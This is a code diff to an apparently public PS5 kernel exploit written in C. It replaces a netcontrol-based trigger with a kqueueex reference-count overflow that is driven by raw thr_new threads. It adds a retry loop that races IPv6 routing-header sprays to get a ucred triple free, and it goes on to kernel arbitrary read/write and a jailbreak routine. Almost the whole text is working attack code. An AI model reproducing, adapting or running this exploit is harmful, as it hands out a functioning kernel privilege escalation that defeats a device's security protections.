@@ -1,4 +1,4 @@
-// Credits : TheFloW, egycnq, Gezine
+// Credits : TheFloW, egycnq, cheburek3000, Gezine
 
 #include "types.h"
 
@@ -50,9 +50,17 @@
 #define COMMAND_UIO_WRITE  1
 
 #define MAIN_CORE          5
+#define ERR_TRIPLE_FREE    1
+#define ERR_LEAK_KQUEUE    2
 
-#define ERR_TRIPLE_FREE    2
-#define ERR_LEAK_KQUEUE    3
+#define NULL_FD_COUNT           16
+#define TRIPLEFREE_ATTEMPTS     8
+#define MAX_ROUNDS_TWIN         10
+#define MAX_ROUNDS_TRIPLET      500
+
+#define KQEX_THREAD_NUM         3
+#define KQUEUEEX_CALLS          0xFFFFFFF1ULL
+#define KQUEUEEX_INVALID_PTR    0x800000000000ULL
 
 #define KERNEL_PID         0
 #define SYSCORE_AUTHID     0x4800000000000007ULL
@@ -67,9 +75,6 @@
 #define O_RDONLY           0
 #define SEEK_SET           0
 #define SEEK_END           2
-
-#define NET_CONTROL_NETEVENT_SET_QUEUE   0x20000003
-#define NET_CONTROL_NETEVENT_CLEAR_QUEUE 0x20000007
 
 #define FILEDESCENT_SIZE       0x30
 #define KQ_FDP_OFFSET          0xA8
@@ -107,9 +112,10 @@ typedef s32  (*ioctl_t)            (s32 fd, u64 req, u64 arg);
 typedef s32  (*pipe_t)             (s32 *fds);
 typedef s32  (*fcntl_t)            (s32 fd, s32 cmd, s64 arg);
 typedef s32  (*sched_yield_t)      (void);
+typedef u32  (*sleep_t)            (u32 seconds);
 typedef s32  (*cpuset_setaffinity_t)(s32 lvl, s32 which, s64 id, u64 setsz, void *mask);
 typedef s32  (*rtprio_thread_t)    (s32 fn, s32 lwpid, u64 rtp);
-typedef s32  (*netcontrol_t)       (s32 ifidx, s32 cmd, void *buf, s32 sz);
+typedef s32  (*kqueueex_t)         (const char *name, s32 flags);
 typedef s64  (*sendto_t)           (s32 fd, const void *buf, u64 len, s32 flags,
                                     const void *to, u32 tolen);
 typedef s32  (*pthread_create_t)   (u64 *thr, void *attr, void *(*fn)(void*), void *arg);
@@ -164,9 +170,10 @@ typedef struct {
     pipe_t                fn_pipe;
     fcntl_t               fn_fcntl;
     sched_yield_t         fn_sched_yield;
+    sleep_t               fn_sleep;
     cpuset_setaffinity_t  fn_cpuset_setaffinity;
     rtprio_thread_t       fn_rtprio_thread;
-    netcontrol_t          fn_netcontrol;
+    kqueueex_t            fn_kqueueex;
     sendto_t              fn_sendto;
     pthread_create_t      fn_pthread_create;
     pthread_join_t           fn_pthread_join;
@@ -223,9 +230,17 @@ typedef struct {
 
     u64  fdt_ofiles;
 
+    
     s32  twins[2];
     s32  triplets[3];
-    s32  uaf_sock;
+    s32  null_fds[NULL_FD_COUNT];
+    s32  free_fd_idx;
+
+    u64  kqex_threads[KQEX_THREAD_NUM];
+    void *kqex_args;
+    volatile u64 kqex_counter;
+    volatile s32 kqex_done;
+    volatile s32 kqex_go;
 
 } exploit_ctx_t;
 
@@ -233,6 +248,12 @@ typedef struct {
     exploit_ctx_t  *ctx;
     worker_state_t *state;
 } thread_arg_t;
+
+typedef struct {
+    exploit_ctx_t *ctx;
+    s32            core;
+} kqex_arg_t;
+
 
 __attribute__((naked))
 static u64 eboot_wrap(void *gadget, void *fn,
@@ -261,6 +282,54 @@ static u64 eboot_wrap(void *gadget, void *fn,
 #define CALL(ctx, fn, a1, a2, a3, a4, a5, a6) \
     eboot_wrap((ctx)->gadget, (void*)(ctx)->fn, \
                (u64)(a1),(u64)(a2),(u64)(a3),(u64)(a4),(u64)(a5),(u64)(a6))
+
+__attribute__((naked))
+static u64 syscall_wrap(void *gadget, void *syscall_stub,
+                        u64 num, u64 a1, u64 a2, u64 a3, u64 a4, u64 a5)
+{
+    __asm__ (
+        "push rbx\n\t"
+        "push r12\n\t"
+        "mov rbx, rsi\n\t"       
+        "mov r12, rdi\n\t"       
+        "mov rax, rdx\n\t"       
+        "mov rdi, rcx\n\t"       
+        "mov rsi, r8\n\t"        
+        "mov rdx, r9\n\t"        
+        "mov rcx, [rsp + 24]\n\t"
+        "mov r8,  [rsp + 32]\n\t"
+        "call r12\n\t"           
+        "pop r12\n\t"
+        "pop rbx\n\t"
+        "ret"
+    );
+}
+
+#define SYSCALL_RAW(ctx, num, a1, a2, a3, a4, a5) \
+    syscall_wrap((ctx)->gadget, \
+                 (void*)((u64)(ctx)->fn_getpid + 7), \
+                 (u64)(num),(u64)(a1),(u64)(a2),(u64)(a3),(u64)(a4),(u64)(a5))
+
+#define SYS_THR_NEW  0x1C7ULL
+#define SYS_THR_EXIT 0x1AFULL
+
+typedef struct {
+    u64 start_func; 
+    u64 arg;        
+    u64 stack_base; 
+    u64 stack_size; 
+    u64 tls_base;   
+    u64 tls_size;   
+    u64 child_tid;  
+    u64 parent_tid; 
+    s32 flags;      
+    s32 pad;        
+    u64 rtp;        
+    u64 spare[3];   
+} thr_param_t;      
+
+#define THR_STACK_SIZE 0x8000ULL
+#define THR_TLS_SIZE   0x40ULL
 
 static void resolve(void *gadget, dlsym_t dlsym, s32 handle,
                     const char *name, void **out)
@@ -322,6 +391,7 @@ static void log_hex64(exploit_ctx_t *ctx, const char *msg, u64 v)
     buf[i++]='\n'; buf[i]='\0';
     log_send(ctx, buf);
 }
+
 
 #define WS_LOCK(ws)      eboot_wrap((ws)->gadget,(void*)(ws)->fn_lock,     (u64)&(ws)->mutex,0,0,0,0,0)
 #define WS_UNLOCK(ws)    eboot_wrap((ws)->gadget,(void*)(ws)->fn_unlock,   (u64)&(ws)->mutex,0,0,0,0,0)
@@ -548,6 +618,55 @@ static void *uio_thread_fn(void *arg)
     return 0;
 }
 
+
+static void log_progress(exploit_ctx_t *ctx, u32 pct, u32 eta_min, u64 count)
+{
+    const char *h = "0123456789abcdef";
+    char buf[64] = {0};
+    char *p = buf;
+    const char *s = "kqex: cnt=0x";
+    while (*s) *p++ = *s++;
+    for (int sh = 60; sh >= 0; sh -= 4) *p++ = h[(count >> sh) & 0xF];
+    *p++ = ' ';
+    if (pct >= 100) *p++ = '0' + pct/100;
+    if (pct >= 10)  *p++ = '0' + (pct/10)%10;
+    *p++ = '0' + pct%10;
+    *p++ = '%'; *p++ = ' ';
+    s = "eta=";
+    while (*s) *p++ = *s++;
+    u32 v = eta_min;
+    if (v >= 100) *p++ = '0' + v/100;
+    if (v >= 10)  *p++ = '0' + (v/10)%10;
+    *p++ = '0' + v%10;
+    s = "min\n";
+    while (*s) *p++ = *s++;
+    CALL(ctx, fn_sendto, ctx->log_sock, (u64)buf, (u32)(p - buf), 0,
+         (u64)ctx->log_addr, sizeof(ctx->log_addr));
+}
+
+static void  kqex_thread_fn(void *arg)
+{
+    kqex_arg_t    *ta  = (kqex_arg_t*)arg;
+    exploit_ctx_t *ctx = ta->ctx;
+
+    u8 mask[CPU_SET_SIZE] = {0};
+    ((u16*)mask)[0] = (u16)(1 << ta->core);
+    CALL(ctx, fn_cpuset_setaffinity,
+         CPU_LEVEL_WHICH, CPU_WHICH_TID, (u64)-1LL, CPU_SET_SIZE, (u64)mask, 0);
+
+    while (!ctx->kqex_go) {}
+
+    while (1) {
+        u64 n = __sync_fetch_and_add((u64*)&ctx->kqex_counter, 1);
+        if (n >= KQUEUEEX_CALLS) break;
+        CALL(ctx, fn_kqueueex, KQUEUEEX_INVALID_PTR, 0, 0, 0, 0, 0);
+    }
+    __sync_fetch_and_add((s32*)&ctx->kqex_done, 1);
+    
+    while (ctx->kqex_go) {}
+    SYSCALL_RAW(ctx, SYS_THR_EXIT, 0, 0, 0, 0, 0);
+}
+
 static s32 find_twins(exploit_ctx_t *ctx)
 {
     for (int attempts = 0; attempts < 5000; attempts++) {
@@ -611,26 +730,99 @@ static s32 find_triplet(exploit_ctx_t *ctx, s32 master, s32 other)
     return -1;
 }
 
+static void free_one_fd(exploit_ctx_t *ctx)
+{
+    CALL(ctx, fn_close, ctx->null_fds[ctx->free_fd_idx], 0, 0, 0, 0, 0);
+    ctx->null_fds[ctx->free_fd_idx] = -1;
+    ctx->free_fd_idx++;
+}
+
+static s32 attempt_race(exploit_ctx_t *ctx)
+{
+    for (int i = 0; i < IPV6_SOCK_NUM; i++)
+        free_rthdr(ctx, ctx->ipv6_socks[i]);
+
+    free_one_fd(ctx);
+
+    for (int i = 0; i < 32; i++) {
+        worker_signal_work(&ctx->iov_state, 0);
+        CALL(ctx, fn_sched_yield, 0, 0, 0, 0, 0, 0);
+        CALL(ctx, fn_write, ctx->iov_ss[1], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
+        worker_wait_for_finished(&ctx->iov_state);
+        CALL(ctx, fn_read,  ctx->iov_ss[0], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
+    }
+
+    free_one_fd(ctx);
+
+    if (!find_twins(ctx)) {
+        LOG(ctx, "attempt_race: twins not found\n");
+        return 0;
+    }
+
+    free_rthdr(ctx, ctx->ipv6_socks[ctx->twins[1]]);
+    CALL(ctx, fn_sched_yield, 0, 0, 0, 0, 0, 0);
+    CALL(ctx, fn_sched_yield, 0, 0, 0, 0, 0, 0);
+
+    s32 reclaimed = 0;
+    for (int r = 0; r < MAX_ROUNDS_TRIPLET; r++) {
+        worker_signal_work(&ctx->iov_state, 0);
+        CALL(ctx, fn_sched_yield, 0, 0, 0, 0, 0, 0);
+        CALL(ctx, fn_sched_yield, 0, 0, 0, 0, 0, 0);
+        CALL(ctx, fn_sched_yield, 0, 0, 0, 0, 0, 0);
+        CALL(ctx, fn_sched_yield, 0, 0, 0, 0, 0, 0);
+        ctx->leak_rthdr_len = 8;
+        get_rthdr(ctx, ctx->ipv6_socks[ctx->twins[0]],
+                  ctx->leak_rthdr, &ctx->leak_rthdr_len);
+        if (GET32(ctx->leak_rthdr, 0x00) == 1) { reclaimed = 1; break; }
+        CALL(ctx, fn_write, ctx->iov_ss[1], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
+        worker_wait_for_finished(&ctx->iov_state);
+        CALL(ctx, fn_read,  ctx->iov_ss[0], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
+    }
+    if (!reclaimed) {
+        LOG(ctx, "attempt_race: not reclaimed\n");
+        return 0;
+    }
+
+    ctx->triplets[0] = ctx->twins[0];
+
+    free_one_fd(ctx);
+    CALL(ctx, fn_sched_yield, 0, 0, 0, 0, 0, 0);
+
+    s32 ret = find_triplet(ctx, ctx->triplets[0], -1);
+    if (ret < 0) { LOG(ctx, "attempt_race: triplets[1] not found\n"); return 0; }
+    ctx->triplets[1] = ret;
+
+    CALL(ctx, fn_write, ctx->iov_ss[1], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
+
+    ret = find_triplet(ctx, ctx->triplets[0], ctx->triplets[1]);
+    if (ret < 0) {
+        worker_wait_for_finished(&ctx->iov_state);
+        CALL(ctx, fn_read, ctx->iov_ss[0], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
+        LOG(ctx, "attempt_race: triplets[2] not found\n");
+        return 0;
+    }
+    ctx->triplets[2] = ret;
+
+    worker_wait_for_finished(&ctx->iov_state);
+    CALL(ctx, fn_read, ctx->iov_ss[0], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
+    return 1;
+}
+
 static s32 trigger_ucred_triple_free(exploit_ctx_t *ctx)
 {
     LOG(ctx, "tctf: enter\n");
 
-    
     ctx->spray_rthdr_len = build_rthdr(ctx->spray_rthdr, UCRED_SIZE);
 
-    
     PUT64(ctx->msg_hdr, 0x10, (u64)ctx->msg_iov);
     PUT64(ctx->msg_hdr, 0x18, MSG_IOV_NUM);
 
-    
     PUT64(ctx->uio_iov_read,  0x00, (u64)ctx->dummy_buf);
     PUT64(ctx->uio_iov_write, 0x00, (u64)ctx->dummy_buf);
 
-    
     CALL(ctx, fn_socketpair, AF_UNIX, SOCK_STREAM, 0, (u64)ctx->uio_ss, 0, 0);
     CALL(ctx, fn_socketpair, AF_UNIX, SOCK_STREAM, 0, (u64)ctx->iov_ss, 0, 0);
 
-    
     thread_arg_t *iov_args = (thread_arg_t*)
         CALL(ctx, fn_calloc, IOV_THREAD_NUM, sizeof(thread_arg_t), 0, 0, 0, 0);
     thread_arg_t *uio_args = (thread_arg_t*)
@@ -646,7 +838,6 @@ static s32 trigger_ucred_triple_free(exploit_ctx_t *ctx)
                    (u64)&ctx->iov_threads[i], 0,
                    (u64)iov_thread_fn, (u64)&iov_args[i], 0, 0);
     }
-
     for (int i = 0; i < UIO_THREAD_NUM; i++) {
         uio_args[i].ctx   = ctx;
         uio_args[i].state = &ctx->uio_state;
@@ -655,113 +846,87 @@ static s32 trigger_ucred_triple_free(exploit_ctx_t *ctx)
                    (u64)uio_thread_fn, (u64)&uio_args[i], 0, 0);
     }
 
-    
-    log_hex32(ctx, "tctf: ipv6_socks[0]=", (u32)ctx->ipv6_socks[0]);
-
     for (int i = 0; i < IPV6_SOCK_NUM; i++)
         free_rthdr(ctx, ctx->ipv6_socks[i]);
 
-    
     PUT64(ctx->msg_iov, 0x00, 1);
     PUT64(ctx->msg_iov, 0x08, 1);
-
     
-    u8 set_buf[8]   = {0};
-    u8 clear_buf[8] = {0};
+    ctx->kqex_args = (void*)CALL(ctx, fn_calloc,
+                                 KQEX_THREAD_NUM, sizeof(kqex_arg_t), 0, 0, 0, 0);
+    kqex_arg_t *kqex_args = (kqex_arg_t*)ctx->kqex_args;
 
-    s32 dummy_sock = (s32)CALL(ctx, fn_socket,
-                               AF_UNIX, SOCK_STREAM, 0, 0, 0, 0);
-    PUT32(set_buf, 0, dummy_sock);
+    s32 kqex_cores[KQEX_THREAD_NUM] = {1, 2, 3};
+    ctx->kqex_counter = 0;
+    ctx->kqex_done    = 0;
+    ctx->kqex_go      = 0;
 
-    s32 slot = 0;
-    if ((s32)CALL(ctx, fn_netcontrol,
-                  -1, NET_CONTROL_NETEVENT_SET_QUEUE,
-                  (u64)set_buf, 8, 0, 0) != 0) {
-        LOG(ctx, "netcontrol: falling back to slot 1\n");
-        if ((s32)CALL(ctx, fn_netcontrol,
-                      1, NET_CONTROL_NETEVENT_SET_QUEUE,
-                      (u64)set_buf, 8, 0, 0) != 0) {
-            LOG(ctx, "netcontrol: all slots occupied\n");
-            return 0;
-        }
-        slot = 1;
-    }
-    log_hex32(ctx, "tctf: netcontrol SET_QUEUE slot=", (u32)slot);
-
-    CALL(ctx, fn_close, dummy_sock, 0, 0, 0, 0, 0);
     CALL(ctx, fn_setuid, 1, 0, 0, 0, 0, 0);
-    ctx->uaf_sock = (s32)CALL(ctx, fn_socket,
-                              AF_UNIX, SOCK_STREAM, 0, 0, 0, 0);
-    CALL(ctx, fn_setuid, 1, 0, 0, 0, 0, 0);
+    CALL(ctx, fn_sleep, 10, 0, 0, 0, 0, 0);
+    LOG(ctx, "tctf: setuid done\n");
 
-    PUT32(clear_buf, 0, ctx->uaf_sock);
-    CALL(ctx, fn_netcontrol, slot, NET_CONTROL_NETEVENT_CLEAR_QUEUE,
-         (u64)clear_buf, 8, 0, 0);
-    LOG(ctx, "tctf: netcontrol CLEAR_QUEUE done\n");
+    // Using pthread is unstable for some reason
+    for (int i = 0; i < KQEX_THREAD_NUM; i++) {
+        kqex_args[i].ctx  = ctx;
+        kqex_args[i].core = kqex_cores[i];
 
-    
-    for (int i = 0; i < 32; i++) {
-        worker_signal_work(&ctx->iov_state, 0);
-        CALL(ctx, fn_sched_yield, 0, 0, 0, 0, 0, 0);
-        CALL(ctx, fn_write, ctx->iov_ss[1], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
-        worker_wait_for_finished(&ctx->iov_state);
-        CALL(ctx, fn_read,  ctx->iov_ss[0], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
+        u64 stack  = CALL(ctx, fn_calloc, 1, THR_STACK_SIZE, 0, 0, 0, 0);
+        u64 tls    = CALL(ctx, fn_calloc, 1, THR_TLS_SIZE,   0, 0, 0, 0);
+        u64 pblock = CALL(ctx, fn_calloc, 1, sizeof(thr_param_t), 0, 0, 0, 0);
+        thr_param_t *tp = (thr_param_t*)pblock;
+
+        tp->start_func = (u64)kqex_thread_fn;
+        tp->arg        = (u64)&kqex_args[i];
+        tp->stack_base = stack;
+        tp->stack_size = THR_STACK_SIZE;
+        tp->tls_base   = tls;
+        tp->tls_size   = THR_TLS_SIZE;
+        tp->child_tid  = (u64)&ctx->kqex_threads[i];
+
+        SYSCALL_RAW(ctx, SYS_THR_NEW, pblock, sizeof(thr_param_t), 0, 0, 0);
     }
-    LOG(ctx, "tctf: iov refcnt reclaim done\n");
+    LOG(ctx, "tctf: kqex threads spawned (thr_new)\n");
 
+    ctx->kqex_go = 1;
+    LOG(ctx, "tctf: kqueueex threads signaled\n");
+
+    u32 elapsed_min = 0;
+    while (ctx->kqex_done < KQEX_THREAD_NUM) {
+        CALL(ctx, fn_sleep, 60, 0, 0, 0, 0, 0);
+        elapsed_min++;
+        u64 done = ctx->kqex_counter;
+        u64 pct  = done / (KQUEUEEX_CALLS / 100);
+        u64 eta  = (done == 0) ? 0 :
+                   (u64)elapsed_min * (KQUEUEEX_CALLS - done) / done;
+        log_progress(ctx, (u32)pct, (u32)eta, done);
+    }
+    LOG(ctx, "tctf: kqueueex overflow done\n");
+
+    for (int i = 0; i < NULL_FD_COUNT; i++) {
+        ctx->null_fds[i] = (s32)CALL(ctx, fn_open,
+                                     (u64)"/dev/null", O_RDONLY, 0, 0, 0, 0);
+        log_hex32(ctx, "tctf: null_fd=", (u32)ctx->null_fds[i]);
+    }
     
-    s32 dup_fd = (s32)CALL(ctx, fn_dup, ctx->uaf_sock, 0, 0, 0, 0, 0);
-    log_hex32(ctx, "tctf: double-free dup_fd=", (u32)dup_fd);
-    CALL(ctx, fn_close, dup_fd, 0, 0, 0, 0, 0);
-    LOG(ctx, "tctf: double-free done\n");
+    CALL(ctx, fn_setuid, 1, 0, 0, 0, 0, 0);
+    CALL(ctx, fn_sleep, 10, 0, 0, 0, 0, 0);
+    LOG(ctx, "tctf: second setuid done\n");
 
-    LOG(ctx, "tctf: starting find_twins\n");
-    if (!find_twins(ctx)) {
-        LOG(ctx, "twins not found\n");
+    ctx->free_fd_idx = 0;
+    s32 race_ok = 0;
+    for (int attempt = 0; attempt < TRIPLEFREE_ATTEMPTS; attempt++) {
+        log_hex32(ctx, "tctf: attempt #", (u32)attempt);
+        if (attempt_race(ctx)) { race_ok = 1; break; }
+    }
+    if (!race_ok) {
+        LOG(ctx, "tctf: all attempts failed\n");
         return 0;
     }
 
-    
-    free_rthdr(ctx, ctx->ipv6_socks[ctx->twins[1]]);
-
-    while (1) {
-        worker_signal_work(&ctx->iov_state, 0);
-        CALL(ctx, fn_sched_yield, 0, 0, 0, 0, 0, 0);
-
-        ctx->leak_rthdr_len = UCRED_SIZE;
-        get_rthdr(ctx, ctx->ipv6_socks[ctx->twins[0]],
-                  ctx->leak_rthdr, &ctx->leak_rthdr_len);
-
-        if (GET32(ctx->leak_rthdr, 0x00) == 1) break;
-
-        CALL(ctx, fn_write, ctx->iov_ss[1], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
-        worker_wait_for_finished(&ctx->iov_state);
-        CALL(ctx, fn_read,  ctx->iov_ss[0], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
-    }
-
-    ctx->triplets[0] = ctx->twins[0];
-
-    
-    dup_fd = (s32)CALL(ctx, fn_dup, ctx->uaf_sock, 0, 0, 0, 0, 0);
-    CALL(ctx, fn_close, dup_fd, 0, 0, 0, 0, 0);
-
-    s32 ret = find_triplet(ctx, ctx->triplets[0], -1);
-    if (ret < 0) { LOG(ctx, "triplets not found\n"); return 0; }
-    ctx->triplets[1] = ret;
-
-    CALL(ctx, fn_write, ctx->iov_ss[1], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
-
-    ret = find_triplet(ctx, ctx->triplets[0], ctx->triplets[1]);
-    if (ret < 0) { LOG(ctx, "triplets not found\n"); return 0; }
-    ctx->triplets[2] = ret;
-
-    worker_wait_for_finished(&ctx->iov_state);
-    CALL(ctx, fn_read, ctx->iov_ss[0], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
-
-    LOG(ctx, "triplets found\n");
-    log_hex32(ctx, "triplets[0] fd=", (u32)ctx->ipv6_socks[ctx->triplets[0]]);
-    log_hex32(ctx, "triplets[1] fd=", (u32)ctx->ipv6_socks[ctx->triplets[1]]);
-    log_hex32(ctx, "triplets[2] fd=", (u32)ctx->ipv6_socks[ctx->triplets[2]]);
+    LOG(ctx, "tctf: triplets found\n");
+    log_hex32(ctx, "tctf: triplets[0] fd=", (u32)ctx->ipv6_socks[ctx->triplets[0]]);
+    log_hex32(ctx, "tctf: triplets[1] fd=", (u32)ctx->ipv6_socks[ctx->triplets[1]]);
+    log_hex32(ctx, "tctf: triplets[2] fd=", (u32)ctx->ipv6_socks[ctx->triplets[2]]);
     return 1;
 }
 
@@ -1015,24 +1180,6 @@ static void remove_rthr_from_socket(exploit_ctx_t *ctx, s32 fd)
         u64 in6p_outputopts  = kread64(ctx, so_pcb + IN6P_OUTPUTOPTS_OFFSET);
         kwrite64(ctx, in6p_outputopts + IP6PO_RHI_RTHDR_OFFSET, 0);
     }
-}
-
-static void remove_uaf_file(exploit_ctx_t *ctx)
-{
-    u64 uaf_file = fget(ctx, ctx->uaf_sock);
-    log_hex64(ctx, "removeUafFile: uaf_file=", uaf_file);
-    kwrite64(ctx, ctx->fdt_ofiles + (u64)ctx->uaf_sock * FILEDESCENT_SIZE, 0);
-
-    s32 removed = 0;
-    for (int i = 0; i < 0x1000 && removed < 3; i++) {
-        s32 s = (s32)CALL(ctx, fn_socket, AF_UNIX, SOCK_STREAM, 0, 0, 0, 0);
-        if (fget(ctx, s) == uaf_file) {
-            kwrite64(ctx, ctx->fdt_ofiles + (u64)s * FILEDESCENT_SIZE, 0);
-            removed++;
-        }
-        CALL(ctx, fn_close, s, 0, 0, 0, 0, 0);
-    }
-    log_hex32(ctx, "removeUafFile: removed=", (u32)removed);
 }
 
 static s32 ps5_jailbreak(exploit_ctx_t *ctx)
@@ -1402,11 +1549,12 @@ u64 main(u64 arg1, u64 arg2, u64 arg3, u64 arg4, u64 arg5, u64 arg6)
     resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "pipe",               (void**)&ctx.fn_pipe);
     resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "fcntl",              (void**)&ctx.fn_fcntl);
     resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "sched_yield",        (void**)&ctx.fn_sched_yield);
+    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "sleep",              (void**)&ctx.fn_sleep);
 
     resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "cpuset_setaffinity", (void**)&ctx.fn_cpuset_setaffinity);
     resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "rtprio_thread",      (void**)&ctx.fn_rtprio_thread);
 
-    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "__sys_netcontrol",   (void**)&ctx.fn_netcontrol);
+    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "__sys_kqueueex",      (void**)&ctx.fn_kqueueex);
 
     resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "pthread_create",         (void**)&ctx.fn_pthread_create);
     resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "pthread_join",           (void**)&ctx.fn_pthread_join);
@@ -1464,6 +1612,7 @@ u64 main(u64 arg1, u64 arg2, u64 arg3, u64 arg4, u64 arg5, u64 arg6)
     ctx.tmp           = (u8*)CALL(&ctx, fn_calloc, 1, PAGE_SIZE,         0, 0, 0, 0);
 
     LOG(&ctx, "exploit: start\n");
+
     
     if (!trigger_ucred_triple_free(&ctx)) {
         LOG(&ctx, "exploit: triggerUcredTripleFree failed\n");
@@ -1506,6 +1655,17 @@ u64 main(u64 arg1, u64 arg2, u64 arg3, u64 arg4, u64 arg5, u64 arg6)
     kwrite_slow(&ctx, master_rpipe_data, master_pipebuf, PIPEBUF_SIZE);
 
     LOG(&ctx, "exploit: arbitrary r/w achieved\n");
+    
+    ctx.kqex_go = 0;
+    CALL(&ctx, fn_free, (u64)ctx.kqex_args, 0, 0, 0, 0, 0);
+    LOG(&ctx, "exploit: kqex threads released\n");
+
+    for (int i = 0; i < NULL_FD_COUNT; i++) {
+        if (ctx.null_fds[i] >= 0) {
+            CALL(&ctx, fn_close, ctx.null_fds[i], 0, 0, 0, 0, 0);
+            ctx.null_fds[i] = -1;
+        }
+    }
 
     fhold(&ctx, fget(&ctx, ctx.master_pipe[0]));
     fhold(&ctx, fget(&ctx, ctx.master_pipe[1]));
@@ -1515,9 +1675,7 @@ u64 main(u64 arg1, u64 arg2, u64 arg3, u64 arg4, u64 arg5, u64 arg6)
     remove_rthr_from_socket(&ctx, ctx.ipv6_socks[ctx.triplets[0]]);
     remove_rthr_from_socket(&ctx, ctx.ipv6_socks[ctx.triplets[1]]);
     remove_rthr_from_socket(&ctx, ctx.ipv6_socks[ctx.triplets[2]]);
-
-    remove_uaf_file(&ctx);
-
+    
     ctx.allproc = find_allproc(&ctx);
     log_hex64(&ctx, "exploit: allproc=",  ctx.allproc);
     log_hex64(&ctx, "exploit: curproc=",  ctx.curproc);
